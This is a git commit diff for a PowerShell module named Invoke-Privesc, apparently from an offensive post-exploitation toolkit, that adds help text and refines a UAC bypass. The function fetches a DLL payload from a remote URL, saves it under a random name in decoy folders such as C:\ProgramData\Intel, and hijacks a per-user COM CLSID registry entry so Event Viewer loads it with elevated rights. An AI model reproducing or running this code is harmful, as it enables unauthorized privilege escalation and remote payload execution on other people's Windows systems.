2eb075109dd6348efe581949912b9609c1fc35f5
SecureMode <43304873+securemode@users.noreply.github.com>
2019-01-13 13:36:19 -0500

    Add files via upload

--- modules/Invoke-Privesc.ps1
+++ modules/Invoke-Privesc.ps1
@@ -1,13 +1,38 @@
 function Invoke-Privesc {
+<# 
+
+.SYNOPSIS
+	Commands for either elevating to a higher integrity-level or elevating privileges via other means.
+
+.PARAMETER Help
+	Shows Detailed Help.
+
+.PARAMETER List
+	Shows Brief Command Help.
+
+.PARAMETER UacBypass
+	Downloads a remotely hosted DLL payload and executes a UAC bypass using CLSID 0A29FF9E-7F9C-4437-8B11-F424491E3931 "InProcServer"Event Viewer (mmc.exe) Method. Requires Admin User with UAC set to "Default". (Win 10.0.16299)
+
+.EXAMPLE 
+	PS> Invoke-Privesc -UacBypass -RemoteDll https://srv/file.dll
+
+.NOTES
+	Author: Fabrizio Siciliano (@0rbz_)
+
+#>
+
 [CmdletBinding()]
 param (
+	[Parameter(Position=1)]
 	[Switch]$Help,
-	[Switch]$List,
+	[switch]$List,
+	
+	[Parameter(Mandatory = $False)]
 	[Switch]$UacBypass,
 	[String]$RemoteDll
 )
 	
-$Rs1 = (-join ((65..90) + (97..122) | Get-Random -Count 13 | foreach {[char]$_}))
+$Rs1 = (-join ((65..90) + (97..122) | Get-Random -Count 5 | foreach {[char]$_}))
 
 $DataDirs = @(
 	("C:\ProgramData\Intel"),
@@ -57,54 +82,58 @@ $datadir = ($newarray[(get-random -Maximum ([array]$newarray).count)])
 		
 		Write @"
 	
- ### Invoke-Privesc HELP ###
+ ### Invoke-Privesc Help ###
  ---------------------------
- 
- Invoke-Privesc [-command] [-parameter(s)]
- 
  Available Invoke-Privesc Commands:
  ----------------------------------
- /-----------------------------------------------------------------------------/
+ |-----------------------------------------------------------------------------|
  | -UacBypass [-RemoteDll] remote_dll                                          |
- | --------------------------------------------------------------------------- |
- |                                                                             |
- |  [?] Description: Downloads a remotely hosted DLL payload                   |
- |      and executes a UAC bypass using CLSID                                  |
- |      0A29FF9E-7F9C-4437-8B11-F424491E3931 "InProcServer"                    |
- |      Event Viewer (mmc.exe) Method. Requires Admin User with UAC            |
- |      set to "Default". (Win 10.0.16299)                                     |
- |                                                                             |
- |  [?] Usage: Invoke-Privesc -UacBypass -RemoteDll https://srv/file.dll       |
- /-----------------------------------------------------------------------------/
+ |-----------------------------------------------------------------------------|
+
+   [?] Description: Downloads a remotely hosted DLL payload and executes a UAC 
+       bypass using CLSID 0A29FF9E-7F9C-4437-8B11-F424491E3931 "InProcServer"
+       Event Viewer (mmc.exe) Method. Requires Admin User with UAC set to 
+       "Default". (Win 10.0.16299)
+                                                                              
+   [?] Usage: Invoke-Privesc -UacBypass -RemoteDll https://srv/file.dll
+   
+ \-----------------------------------------------------------------------------/
 
 "@
 	}
 	elseif ($List -eq $True) {
 		Write @"
 		
- Invoke-Privesc Command List:
- ----------------------------
- Invoke-Privesc -UacBypass [-RemoteDll] remote_dll 
+ Invoke-Privesc Brief Command Usage:
+ -----------------------------------
+ Invoke-Privesc -UacBypass -RemoteDll https://srv/file.dll
  
 "@
 	}
 	
 	elseif ($UacBypass -and $RemoteDll) {
-	# https://twitter.com/UnaPibaGeek/status/1067777096955674625
-
+		
+		if ($PSVersionTable.PSVersion.Major -eq "2") {
+			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
+			return
+		}
+		
+		# https://twitter.com/UnaPibaGeek/status/1067777096955674625
 		$ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
 	
 		$SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
 	
 		if ($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1) {
-			Write " [!] UAC is set to 'Always Notify', Can't bypass with this settings. Requires 'Default' UAC setting."
+			Write "`n [!] UAC is set to 'Always Notify', Can't bypass with this settings. Requires 'Default' UAC setting.`n"
 			Return
 		}
 		else {
 		
 			$ClsidRegPath = "HKCU:\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32"
 			$ValName = "(Default)"
-			$LocalDll = "$DataDir\$rs1.dll"
+			
+			# download the dll into a random directory and a randomized file name.
+			$LocalDll = "$DataDir\$Rs1.dll"
 		
 			(New-Object System.Net.Webclient).downloadfile("$RemoteDll", "$LocalDll")
 		
